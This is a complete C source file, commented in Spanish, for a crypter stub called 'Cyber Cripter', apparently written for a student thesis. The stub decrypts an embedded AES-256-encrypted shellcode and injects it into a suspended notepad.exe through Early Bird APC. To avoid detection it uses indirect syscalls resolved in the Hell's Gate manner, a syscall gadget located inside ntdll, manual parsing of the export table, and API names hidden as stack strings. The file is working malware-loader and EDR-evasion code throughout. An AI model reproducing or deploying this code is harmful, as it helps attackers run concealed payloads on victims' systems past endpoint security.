/*
 * Cyber Cripter — native stub (variante con Indirect System Calls).
 *
 * Misma estructura, metadatos y criptografía que stub_EarlyBirdAPC.c. La única
 * diferencia está en la fase de inyección: en lugar de usar las APIs Win32
 * (VirtualAllocEx, WriteProcessMemory, QueueUserAPC, ResumeThread), este stub
 * resuelve los SSN (System Service Numbers) de las Nt* equivalentes en ntdll
 * y las invoca mediante una instrucción `syscall` ejecutada DESDE memoria de
 * ntdll, evadiendo hooks de userland que las EDR colocan al inicio de cada
 * función Nt* en ntdll.
 *
 * Componentes nuevos respecto a stub_EarlyBirdAPC.c:
 *   - get_ntdll_base()           — localiza ntdll caminando el PEB.
 *   - find_export()              — busca una función exportada en una DLL ya mapeada.
 *   - extract_ssn()              — lee el SSN del prólogo de un Nt* (Hell's Gate).
 *   - find_syscall_gadget()      — busca un gadget `syscall; ret` dentro de ntdll.
 *   - do_syscall (en syscall.asm) — trampolín que ejecuta el syscall indirecto.
 *   - isc_apc_inject()           — equivalente de eb_apc_inject usando los Nt* directos.
 *
 * Flujo en runtime (idéntico al EarlyBird, solo cambia el paso 5):
 *   1. Leer el propio fichero desde disco.
 *   2. Re-derivar la clave AES-256 con SHA-256 sobre heap_marker || self[0..hr] || ts.
 *   3. Remontar el ciphertext = half1 || half2.
 *   4. Descifrar con AES-256-CBC -> shellcode (salida de Donut).
 *   5. Inyección mediante indirect syscalls en un notepad.exe suspendido.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

/* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (1 MiB).
   Debe coincidir con HALF1_MAX en StubBuilder.cs del builder C#. */
#define HALF1_MAX 0x100000

/* Layout de los metadatos que el builder escribe en .cdata.
   Idéntico al de stub_EarlyBirdAPC.c — el builder C# es agnóstico al tipo de stub. */
#pragma pack(push, 1)
typedef struct {
    unsigned char      magic[16];
    unsigned char      heap_marker[8];
    unsigned long long timestamp;
    unsigned char      iv[16];
    unsigned int       half1_size;
    unsigned int       half2_size;
    unsigned int       hash_region_size;
} StubMetadata;
#pragma pack(pop)

#pragma section(".cdata", read)

__declspec(allocate(".cdata"))
volatile const StubMetadata g_meta = {
    /* magic            */ { 'M','E','T','A','!','C','R','Y','p','T','e','R','!',
                              0xAA, 0xBB, 0xCC },
    /* heap_marker      */ { 0, 0, 0, 0, 0, 0, 0, 0 },
    /* timestamp        */ 0,
    /* iv               */ { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 },
    /* half1_size       */ 0,
    /* half2_size       */ 0,
    /* hash_region_size */ 0
};

__declspec(allocate(".cdata"))
volatile const unsigned char g_half1_buf[16 + HALF1_MAX] = {
    'H','A','L','F','!','O','N','E','!','D','A','T','A', 0xDD, 0xEE, 0xFF
};

/* ---------- helpers mínimos (sin dependencia del CRT) ---------- */

/**
 * @brief  Reserva n bytes en el heap del proceso. Sustituto de malloc sin CRT.
 * @param[in]  n  Número de bytes a reservar.
 * @return Puntero al bloque reservado, o NULL si falla la asignación.
 */
static void *xalloc(SIZE_T n) { return HeapAlloc(GetProcessHeap(), 0, n); }

/**
 * @brief  Libera un bloque previamente reservado con xalloc. No hace nada si p es NULL.
 * @param[in]  p  Puntero al bloque a liberar (puede ser NULL).
 */
static void  xfree(void *p)   { if (p) HeapFree(GetProcessHeap(), 0, p); }

/**
 * @brief  Copia n bytes de src a dst. Sustituto de memcpy sin CRT.
 * @param[out] dst  Buffer de destino; debe tener al menos n bytes disponibles.
 * @param[in]  src  Buffer de origen.
 * @param[in]  n    Número de bytes a copiar.
 */
static void xcopy(void *dst, const void *src, SIZE_T n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
}

/**
 * @brief  Sobreescribe n bytes de p con ceros. Sustituto de memset seguro sin CRT.
 *         volatile impide al compilador eliminar el bucle como "código muerto".
 * @param[in,out] p  Buffer a borrar.
 * @param[in]     n  Número de bytes a poner a cero.
 */
static void xzero(void *p, SIZE_T n)
{
    volatile unsigned char *d = (volatile unsigned char *)p;
    while (n--) *d++ = 0;
}

/* ---------- lectura del propio fichero desde disco ---------- */

/**
 * @brief  Lee el binario del stub completo desde disco. Necesario para hashear
 *         el prefijo en la derivación de clave y para acceder al overlay (half2).
 * @param[out] out       Buffer reservado con el contenido del fichero (xfree() para liberar).
 * @param[out] out_size  Tamaño del fichero leído en bytes.
 * @return 1 si la lectura fue correcta, 0 en caso de error.
 */
static int read_self(unsigned char **out, DWORD *out_size)
{
    char path[MAX_PATH];
    DWORD pl = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (pl == 0 || pl >= MAX_PATH) return 0;

    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    LARGE_INTEGER fs;
    if (!GetFileSizeEx(h, &fs) || fs.QuadPart > 0x10000000) {
        CloseHandle(h); return 0;
    }
    DWORD size = (DWORD)fs.QuadPart;
    unsigned char *buf = (unsigned char *)xalloc(size);
    if (!buf) { CloseHandle(h); return 0; }

    DWORD got = 0;
    if (!ReadFile(h, buf, size, &got, NULL) || got != size) {
        xfree(buf); CloseHandle(h); return 0;
    }
    CloseHandle(h);
    *out = buf; *out_size = size;
    return 1;
}

/* ---------- SHA-256 via CNG ---------- */

/**
 * @brief  Calcula SHA-256 sobre un buffer usando la API CNG (BCrypt).
 * @param[in]  in      Buffer de entrada.
 * @param[in]  in_len  Longitud del buffer en bytes.
 * @param[out] out     Array de 32 bytes donde se escribe el digest.
 * @return 1 si éxito, 0 si CNG devolvió error.
 */
static int cng_sha256(const unsigned char *in, DWORD in_len, unsigned char out[32])
{
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto end;
    if (BCryptHashData(hHash, (PUCHAR)in, in_len, 0) != 0)        goto end;
    if (BCryptFinishHash(hHash, out, 32, 0) != 0)                 goto end;
    ok = 1;
end:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- descifrado AES-256-CBC con padding PKCS#7 via CNG ---------- */

/**
 * @brief  Descifra un buffer con AES-256-CBC (padding PKCS#7) usando BCrypt.
 *         Dos llamadas a BCryptDecrypt: una para tamaño, otra para descifrado.
 *         El IV se restaura entre ambas porque BCryptDecrypt lo muta.
 * @param[in]  key      Clave AES de 32 bytes derivada por SHA-256.
 * @param[in]  iv_in    IV de 16 bytes (copia interna, no se modifica).
 * @param[in]  ct       Buffer con el ciphertext.
 * @param[in]  ct_len   Longitud del ciphertext (múltiplo de 16).
 * @param[out] out      Plaintext descifrado (xfree() para liberar).
 * @param[out] out_len  Longitud del plaintext tras eliminar el padding.
 * @return 1 si éxito, 0 si error.
 */
static int cng_aes256cbc_decrypt(const unsigned char key[32],
                                 const unsigned char iv_in[16],
                                 const unsigned char *ct, DWORD ct_len,
                                 unsigned char **out, DWORD *out_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char iv[16];
    unsigned char *pt = NULL;
    DWORD plen = 0;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto end;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)key, 32, 0) != 0) goto end;

    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      NULL, 0, &plen, BCRYPT_BLOCK_PADDING) != 0) goto end;
    pt = (unsigned char *)xalloc(plen);
    if (!pt) goto end;

    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      pt, plen, &plen, BCRYPT_BLOCK_PADDING) != 0) {
        xfree(pt); pt = NULL; goto end;
    }
    *out = pt; *out_len = plen;
    ok = 1;
end:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- infraestructura de indirect syscalls ---------- */

/* Tipo NTSTATUS — winternl.h ya lo define como LONG (lo dejamos por compatibilidad). */
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

/* Globales leídas por el trampolín ASM (syscall.asm).
   El stub C escribe aquí antes de cada llamada y luego invoca do_syscall.
   Volatile para que el compilador no las optimice — el ASM las lee directamente. */
volatile DWORD g_current_ssn = 0;
volatile PVOID g_syscall_gadget = NULL;

/* Símbolo definido en syscall.asm: trampolín que ejecuta `syscall` desde ntdll.
   La firma real varía según el Nt* invocado; se hace cast del puntero en cada call site. */
extern NTSTATUS NTAPI do_syscall(void);

/**
 * @brief  Obtiene la base en memoria de ntdll.dll caminando el PEB.
 *         En x64 el PEB está en gs:[0x60]. PEB->Ldr->InMemoryOrderModuleList tiene
 *         como segunda entrada (tras el propio exe) a ntdll.dll, siempre cargada.
 *         Evita usar GetModuleHandleA("ntdll.dll") porque eso aparecería en la IAT
 *         y delataría intención de tocar ntdll directamente.
 * @return Puntero base de ntdll.dll en memoria, o NULL si la estructura PEB no es válida.
 */
static PVOID get_ntdll_base(void)
{
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return NULL;

    /* InMemoryOrderModuleList enlaza las DLLs en el orden en que fueron mapeadas:
       1ª entrada = .exe del proceso, 2ª = ntdll.dll, 3ª = kernel32.dll, ... */
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink->Flink;  /* saltar el exe -> obtener ntdll */

    /* InMemoryOrderLinks es el campo de enlace dentro de LDR_DATA_TABLE_ENTRY;
       CONTAINING_RECORD recupera el inicio de la estructura. */
    PLDR_DATA_TABLE_ENTRY ldr = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return ldr->DllBase;
}

/**
 * @brief  Busca una función exportada en una DLL mapeada parseando manualmente la
 *         tabla de exports del PE. Evita usar GetProcAddress (que las EDR vigilan).
 * @param[in] base  Dirección base de la DLL en memoria.
 * @param[in] name  Nombre de la función a buscar (case-sensitive).
 * @return Dirección de la función o NULL si no se encuentra.
 */
static PVOID find_export(PVOID base, const char *name)
{
    if (!base || !name) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + exp_rva);
    DWORD *names    = (DWORD*)((BYTE*)base + exp->AddressOfNames);
    WORD  *ords     = (WORD *)((BYTE*)base + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD*)((BYTE*)base + exp->AddressOfFunctions);

    /* Búsqueda lineal por nombre. Comparación byte-a-byte sin strcmp (sin CRT). */
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *expname = (const char*)((BYTE*)base + names[i]);
        const char *a = expname, *b = name;
        while (*a && *b && *a == *b) { a++; b++; }
        if (*a == 0 && *b == 0) {
            return (BYTE*)base + funcs[ords[i]];
        }
    }
    return NULL;
}

/**
 * @brief  Extrae el SSN (System Service Number) del prólogo de una función Nt*.
 *         En Win10+ todas las Nt* empiezan con:
 *             4C 8B D1           mov r10, rcx
 *             B8 XX XX XX XX     mov eax, <SSN>
 *         Esto se conoce como "Hell's Gate". Si la función está hookeada por una EDR,
 *         el prólogo será un `jmp <hook>` y el patrón no coincidirá.
 * @param[in] fn  Dirección de la función Nt* en ntdll.
 * @return SSN de 32 bits, o 0xFFFFFFFF si la función parece hookeada o inválida.
 */
static DWORD extract_ssn(PVOID fn)
{
    if (!fn) return 0xFFFFFFFF;
    BYTE *p = (BYTE*)fn;
    /* Validar patrón: mov r10,rcx (4C 8B D1) seguido de mov eax,imm32 (B8 ...) */
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(DWORD*)(p + 4);
    }
    return 0xFFFFFFFF;
}

/**
 * @brief  Busca un gadget `syscall; ret` (bytes 0F 05 C3) dentro de la sección .text
 *         de ntdll. Cualquier Nt* sin hookear contiene uno al final de su prólogo,
 *         así que la primera coincidencia sirve. Saltar a ese gadget hace que la
 *         instrucción `syscall` se ejecute desde memoria de ntdll (no desde el stub),
 *         lo que es el sello distintivo de la técnica "indirect syscall".
 * @param[in] ntdll_base  Dirección base de ntdll.dll en memoria.
 * @return Dirección del primer gadget encontrado, o NULL si no aparece.
 */
static PVOID find_syscall_gadget(PVOID ntdll_base)
{
    if (!ntdll_base) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)ntdll_base + dos->e_lfanew);

    /* Recorrer las secciones buscando .text */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Name[0] == '.' && sec[i].Name[1] == 't' &&
            sec[i].Name[2] == 'e' && sec[i].Name[3] == 'x' &&
            sec[i].Name[4] == 't') {
            BYTE  *text = (BYTE*)ntdll_base + sec[i].VirtualAddress;
            DWORD  size = sec[i].Misc.VirtualSize;
            /* Buscar secuencia 0F 05 C3 = syscall; ret */
            for (DWORD j = 0; j + 2 < size; j++) {
                if (text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3) {
                    return &text[j];
                }
            }
        }
    }
    return NULL;
}

/* ---------- inyección via indirect syscalls en notepad.exe ---------- */

/* Firmas de las funciones Nt* que vamos a invocar mediante el trampolín do_syscall.
   Castearemos do_syscall a estos punteros en cada call site. */
typedef NTSTATUS (NTAPI *fn_NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *fn_NtQueueApcThread_t)(HANDLE, PVOID, PVOID, PVOID, ULONG);
typedef NTSTATUS (NTAPI *fn_NtResumeThread_t)(HANDLE, PULONG);

/**
 * @brief  Inyecta shellcode PIC en notepad.exe usando indirect syscalls.
 *         Mismo flujo EarlyBird APC que stub_EarlyBirdAPC.c, pero las cuatro
 *         operaciones críticas (alloc, write, queue APC, resume) se hacen
 *         mediante `syscall` ejecutado desde ntdll, no a través de las APIs
 *         Win32 cuyas Nt* equivalentes suelen estar hookeadas por EDRs.
 *
 *         Nota: la creación del proceso sigue usando CreateProcessA. Hacerlo via
 *         NtCreateUserProcess es posible pero complejo (necesita rellenar
 *         RTL_USER_PROCESS_PARAMETERS y PS_ATTRIBUTE_LIST). Para este TFG
 *         el contraste relevante son las cuatro operaciones siguientes.
 *
 * @param[in] sc      Buffer con el shellcode PIC a ejecutar en el proceso remoto.
 * @param[in] sc_len  Tamaño del shellcode en bytes.
 * @return 1 si la inyección se completó correctamente, 0 en caso de error.
 */
static int isc_apc_inject(const unsigned char *sc, SIZE_T sc_len)
{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    char target[] = "C:\\Windows\\System32\\notepad.exe";

    xzero(&si, sizeof(si));
    xzero(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;

    /* Paso 1: localizar ntdll y el gadget syscall;ret */
    PVOID ntdll = get_ntdll_base();
    if (!ntdll) goto fail;
    g_syscall_gadget = find_syscall_gadget(ntdll);
    if (!g_syscall_gadget) goto fail;

    /* Paso 2: resolver SSNs.
       Construimos los nombres como "stack strings" (un char literal por elemento)
       para que NO aparezcan como cadenas contiguas en .rdata. Esto los hace
       invisibles a `strings nuestro_stub.exe` y a firmas estáticas básicas. */
    char name_alloc [] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char name_write [] = {'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char name_apc   [] = {'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d',0};
    char name_resume[] = {'N','t','R','e','s','u','m','e','T','h','r','e','a','d',0};

    DWORD ssn_alloc  = extract_ssn(find_export(ntdll, name_alloc));
    DWORD ssn_write  = extract_ssn(find_export(ntdll, name_write));
    DWORD ssn_apc    = extract_ssn(find_export(ntdll, name_apc));
    DWORD ssn_resume = extract_ssn(find_export(ntdll, name_resume));

    if (ssn_alloc  == 0xFFFFFFFF || ssn_write  == 0xFFFFFFFF ||
        ssn_apc    == 0xFFFFFFFF || ssn_resume == 0xFFFFFFFF) goto fail;

    /* Paso 3: NtAllocateVirtualMemory — reservar memoria RWX en notepad.exe */
    PVOID  rmem  = NULL;
    SIZE_T rsize = sc_len;
    g_current_ssn = ssn_alloc;
    NTSTATUS s = ((fn_NtAllocateVirtualMemory_t)do_syscall)(
        pi.hProcess, &rmem, 0, &rsize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(s)) goto fail;

    /* Paso 4: NtWriteVirtualMemory — copiar el shellcode al proceso remoto */
    SIZE_T written = 0;
    g_current_ssn = ssn_write;
    s = ((fn_NtWriteVirtualMemory_t)do_syscall)(
        pi.hProcess, rmem, (PVOID)sc, sc_len, &written);
    if (!NT_SUCCESS(s) || written != sc_len) goto fail;

    /* Paso 5: NtQueueApcThread — encolar APC sobre el hilo primario (suspendido) */
    g_current_ssn = ssn_apc;
    s = ((fn_NtQueueApcThread_t)do_syscall)(
        pi.hThread, rmem, NULL, NULL, 0);
    if (!NT_SUCCESS(s)) goto fail;

    /* Paso 6: NtResumeThread — reanudar el hilo; la APC dispara en NtTestAlert */
    ULONG prev_count = 0;
    g_current_ssn = ssn_resume;
    s = ((fn_NtResumeThread_t)do_syscall)(pi.hThread, &prev_count);
    if (!NT_SUCCESS(s)) goto fail;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;

fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

/* ---------- punto de entrada ---------- */

/**
 * @brief  Punto de entrada del stub. Idéntico al de stub_EarlyBirdAPC.c excepto
 *         por la llamada final a isc_apc_inject() en lugar de eb_apc_inject().
 * @return 0 si éxito; 1–6 indican el paso que falló.
 */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    /* Paso 1: leer el propio binario desde disco */
    unsigned char *self = NULL;
    DWORD self_size = 0;
    if (!read_self(&self, &self_size)) return 1;

    DWORD hr = g_meta.hash_region_size;
    DWORD h1 = g_meta.half1_size;
    DWORD h2 = g_meta.half2_size;

    if (hr == 0 || hr > self_size || h1 > HALF1_MAX || h2 > self_size
        || (h1 + h2) < h1) {
        xfree(self); return 2;
    }

    /* Paso 2: derivar la clave AES = SHA256(heap_marker || self[0..hr] || timestamp) */
    DWORD hin_len = 8 + hr + 8;
    unsigned char *hin = (unsigned char *)xalloc(hin_len);
    if (!hin) { xfree(self); return 3; }
    xcopy(hin,            (const void *)g_meta.heap_marker, 8);
    xcopy(hin + 8,        self, hr);
    xcopy(hin + 8 + hr,   (const void *)&g_meta.timestamp, 8);

    unsigned char key[32];
    int ok = cng_sha256(hin, hin_len, key);
    xzero(hin, hin_len); xfree(hin);
    if (!ok) { xfree(self); return 4; }

    /* Paso 3: remontar el ciphertext completo = half1 (en .cdata) || half2 (overlay) */
    DWORD ct_len = h1 + h2;
    unsigned char *ct = (unsigned char *)xalloc(ct_len);
    if (!ct) { xzero(key, 32); xfree(self); return 5; }
    xcopy(ct,        (const void *)(g_half1_buf + 16), h1);
    xcopy(ct + h1,   self + (self_size - h2), h2);
    xfree(self);

    unsigned char iv[16];
    xcopy(iv, (const void *)g_meta.iv, 16);

    /* Paso 4: descifrar AES-256-CBC -> shellcode Donut */
    unsigned char *sc = NULL;
    DWORD sc_len = 0;
    ok = cng_aes256cbc_decrypt(key, iv, ct, ct_len, &sc, &sc_len);
    xzero(key, 32); xzero(iv, 16); xzero(ct, ct_len); xfree(ct);
    if (!ok) return 6;

    /* Paso 5: inyectar el shellcode en notepad.exe mediante indirect syscalls */
    isc_apc_inject(sc, sc_len);
    xzero(sc, sc_len); xfree(sc);

    Sleep(2000);
    return 0;
}
